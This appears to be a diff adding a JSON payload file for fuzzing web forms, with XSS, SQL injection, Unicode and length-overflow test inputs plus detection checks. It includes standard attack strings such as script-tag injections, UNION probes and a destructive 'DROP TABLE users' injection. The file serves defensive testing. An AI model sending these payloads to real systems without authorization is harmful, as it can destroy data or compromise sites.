@@ -1,0 +1,287 @@
+{
+  "$schema": "https://json-schema.org/draft/2020-12/schema",
+  "version": "1.0.0",
+  "description": "Form fuzzing payloads for security and edge case testing",
+  "categories": {
+    "xss": {
+      "name": "Cross-Site Scripting (XSS)",
+      "description": "Payloads to test XSS sanitization and filtering",
+      "severity": "critical",
+      "payloads": [
+        {
+          "id": "xss-script-basic",
+          "payload": "<script>alert('xss')</script>",
+          "description": "Basic script tag injection"
+        },
+        {
+          "id": "xss-script-encoded",
+          "payload": "<script>alert(String.fromCharCode(88,83,83))</script>",
+          "description": "Encoded script payload"
+        },
+        {
+          "id": "xss-img-onerror",
+          "payload": "<img src=x onerror=alert(1)>",
+          "description": "Image tag with error handler"
+        },
+        {
+          "id": "xss-svg-onload",
+          "payload": "<svg onload=alert(1)>",
+          "description": "SVG with onload handler"
+        },
+        {
+          "id": "xss-body-onload",
+          "payload": "<body onload=alert(1)>",
+          "description": "Body tag with onload"
+        },
+        {
+          "id": "xss-iframe",
+          "payload": "<iframe src=\"javascript:alert(1)\">",
+          "description": "Iframe with javascript URL"
+        },
+        {
+          "id": "xss-event-handler",
+          "payload": "<div onmouseover=alert(1)>hover me</div>",
+          "description": "Event handler injection"
+        },
+        {
+          "id": "xss-javascript-url",
+          "payload": "javascript:alert(1)",
+          "description": "JavaScript protocol handler"
+        },
+        {
+          "id": "xss-data-url",
+          "payload": "<a href=\"data:text/html,<script>alert(1)</script>\">click</a>",
+          "description": "Data URL with script"
+        },
+        {
+          "id": "xss-style-expression",
+          "payload": "<div style=\"background:url(javascript:alert(1))\">",
+          "description": "CSS expression injection"
+        },
+        {
+          "id": "xss-meta-refresh",
+          "payload": "<meta http-equiv=\"refresh\" content=\"0;url=javascript:alert(1)\">",
+          "description": "Meta refresh with javascript"
+        },
+        {
+          "id": "xss-input-onfocus",
+          "payload": "<input onfocus=alert(1) autofocus>",
+          "description": "Input with autofocus and onfocus"
+        },
+        {
+          "id": "xss-marquee",
+          "payload": "<marquee onstart=alert(1)>",
+          "description": "Marquee with onstart handler"
+        },
+        {
+          "id": "xss-details-ontoggle",
+          "payload": "<details open ontoggle=alert(1)>",
+          "description": "Details element with ontoggle"
+        },
+        {
+          "id": "xss-template-literal",
+          "payload": "${alert(1)}",
+          "description": "Template literal injection"
+        }
+      ],
+      "detectionMethods": [
+        "Check if alert/confirm/prompt dialogs appear",
+        "Check for script execution in console",
+        "Check if payload appears unescaped in DOM",
+        "Check for new script elements in page",
+        "Monitor for unexpected network requests"
+      ]
+    },
+    "sqli": {
+      "name": "SQL Injection",
+      "description": "Payloads to test SQL injection vulnerabilities",
+      "severity": "critical",
+      "payloads": [
+        {
+          "id": "sqli-basic-quote",
+          "payload": "' OR '1'='1",
+          "description": "Basic OR injection"
+        },
+        {
+          "id": "sqli-double-quote",
+          "payload": "\" OR \"1\"=\"1",
+          "description": "Double quote OR injection"
+        },
+        {
+          "id": "sqli-comment-bypass",
+          "payload": "' OR 1=1--",
+          "description": "Comment-based bypass"
+        },
+        {
+          "id": "sqli-union-null",
+          "payload": "' UNION SELECT NULL--",
+          "description": "UNION injection probe"
+        },
+        {
+          "id": "sqli-union-multi",
+          "payload": "' UNION SELECT NULL,NULL,NULL--",
+          "description": "Multi-column UNION probe"
+        },
+        {
+          "id": "sqli-drop-table",
+          "payload": "'; DROP TABLE users; --",
+          "description": "Destructive DROP TABLE"
+        },
+        {
+          "id": "sqli-sleep",
+          "payload": "'; WAITFOR DELAY '0:0:5'--",
+          "description": "Time-based injection (MSSQL)"
+        },
+        {
+          "id": "sqli-sleep-mysql",
+          "payload": "' OR SLEEP(5)--",
+          "description": "Time-based injection (MySQL)"
+        },
+        {
+          "id": "sqli-version",
+          "payload": "' UNION SELECT @@version--",
+          "description": "Version extraction"
+        },
+        {
+          "id": "sqli-stacked",
+          "payload": "'; INSERT INTO log VALUES('test'); --",
+          "description": "Stacked query injection"
+        },
+        {
+          "id": "sqli-boolean-true",
+          "payload": "' AND '1'='1",
+          "description": "Boolean-based (true)"
+        },
+        {
+          "id": "sqli-boolean-false",
+          "payload": "' AND '1'='2",
+          "description": "Boolean-based (false)"
+        }
+      ],
+      "detectionMethods": [
+        "Check for database error messages in response",
+        "Compare response with boolean true/false payloads",
+        "Monitor response time for time-based payloads",
+        "Check for unexpected data in response",
+        "Look for HTTP 500 errors"
+      ]
+    },
+    "unicode": {
+      "name": "Unicode & Encoding",
+      "description": "Payloads to test character encoding handling",
+      "severity": "minor",
+      "payloads": [
+        {
+          "id": "unicode-international",
+          "payload": "cafe n beijing emoji",
+          "description": "International characters and emoji"
+        },
+        {
+          "id": "unicode-rtl-override",
+          "payload": "\u202EABC\u202C",
+          "description": "Right-to-left override characters"
+        },
+        {
+          "id": "unicode-zero-width",
+          "payload": "te\u200Bst\u200Bwo\u200Brd",
+          "description": "Zero-width space injection"
+        },
+        {
+          "id": "unicode-homoglyph",
+          "payload": "pаypal.com",
+          "description": "Homoglyph attack (Cyrillic 'a')"
+        },
+        {
+          "id": "unicode-null-byte",
+          "payload": "test\u0000string",
+          "description": "Null byte injection"
+        },
+        {
+          "id": "unicode-bom",
+          "payload": "\uFEFFtest",
+          "description": "Byte order mark prefix"
+        },
+        {
+          "id": "unicode-combining",
+          "payload": "e\u0301\u0301\u0301\u0301\u0301",
+          "description": "Multiple combining characters (Zalgo-style)"
+        },
+        {
+          "id": "unicode-special-spaces",
+          "payload": "test\u00A0\u2003\u2009word",
+          "description": "Various space characters"
+        },
+        {
+          "id": "unicode-surrogate",
+          "payload": "\uD800\uDC00",
+          "description": "Surrogate pair characters"
+        },
+        {
+          "id": "unicode-fullwidth",
+          "payload": "test",
+          "description": "Fullwidth Latin characters"
+        }
+      ],
+      "detectionMethods": [
+        "Check if characters render correctly",
+        "Check for garbled/corrupted text",
+        "Check if layout breaks (RTL)",
+        "Verify data round-trips correctly",
+        "Check for character stripping/replacement"
+      ]
+    },
+    "length": {
+      "name": "Length & Overflow",
+      "description": "Payloads to test input length handling",
+      "severity": "major",
+      "payloads": [
+        {
+          "id": "length-1k",
+          "payload": "[1000_CHARS]",
+          "generateLength": 1000,
+          "description": "1,000 character string"
+        },
+        {
+          "id": "length-10k",
+          "payload": "[10000_CHARS]",
+          "generateLength": 10000,
+          "description": "10,000 character string"
+        },
+        {
+          "id": "length-100k",
+          "payload": "[100000_CHARS]",
+          "generateLength": 100000,
+          "description": "100,000 character string"
+        },
+        {
+          "id": "length-negative",
+          "payload": "-1",
+          "description": "Negative number for numeric fields"
+        }
+      ],
+      "detectionMethods": [
+        "Check if input is truncated appropriately",
+        "Check for client-side errors/crashes",
+        "Check for server-side errors",
+        "Monitor memory usage",
+        "Check for UI overflow/breaking"
+      ]
+    }
+  },
+  "metadata": {
+    "totalPayloads": 41,
+    "lastUpdated": "2025-01-07",
+    "sources": [
+      "OWASP Testing Guide",
+      "PortSwigger Web Security Academy",
+      "HackTricks",
+      "PayloadsAllTheThings"
+    ],
+    "disclaimer": "These payloads are for authorized security testing only. Unauthorized testing is illegal."
+  },
+  "lengthGenerator": {
+    "description": "For length payloads, generate strings of specified length",
+    "characterSet": "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789",
+    "pattern": "Repeat character set to reach desired length"
+  }
+}
